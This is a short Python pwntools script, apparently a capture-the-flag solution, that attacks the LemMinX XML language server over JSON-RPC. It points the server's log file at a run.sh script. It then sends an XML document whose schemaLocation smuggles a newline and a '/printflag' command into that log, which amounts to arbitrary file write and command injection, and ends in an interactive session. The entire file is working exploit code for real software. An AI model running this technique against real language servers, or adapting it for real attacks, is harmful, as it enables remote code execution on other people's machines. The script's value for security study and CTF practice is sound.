from pwn import *
from pprint import pp
import json
import sys

# context.log_level = 'debug'

# io = process(
#     ["java", "-jar", "lemminx/org.eclipse.lemminx/target/org.eclipse.lemminx-uber.jar"]
# )
# io = process(
#     ["./lemminx-linux"]
# )
host = sys.argv[1]
port = int(sys.argv[2])
dirname = sys.argv[3]
io = remote(host, port)


def rpc(io, obj):
    s = json.dumps(obj)
    io.send(f"Content-Length: {len(s)}\r\n\r\n{s}".encode())


def recv(io):
    io.recvuntil(b"Content-Length: ")
    n = int(io.recvlineS().strip())
    io.recvn(2)  # \r\n\r\n
    r = io.recvn(n).decode()
    return json.loads(r)


init = json.loads(open("init2.json").read())
init["initializationOptions"]["settings"]["xml"]["logs"][
    "file"
] = f"/home/ctf/{dirname}/run.sh"
rpc(
    io,
    {
        "jsonrpc": "2.0",
        "method": "initialize",
        "params": init,
        "id": 1,
    },
)
print("init")
pp(recv(io))  # initialize response
# rpc(
#     io,
#     {
#         "jsonrpc": "2.0",
#         "method": "initialized",
#         "id": 1,
#     },
# )

rpc(
    io,
    {
        "jsonrpc": "2.0",
        "method": "textDocument/didOpen",
        "params": {
            "textDocument": {
                "uri": "file:///exp.xml",
                "languageId": "xml",
                "version": 1,
                "text": """
<project xmlns="http://maven.apache.org/POM/4.0.0"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
  http://random/%0a/printflag%20%23">
</project>
""",
            }
        },
    },
)
sleep(3)
rpc(io, {"jsonrpc": "2.0", "method": "exit"})

print("interactive")
io.interactive()
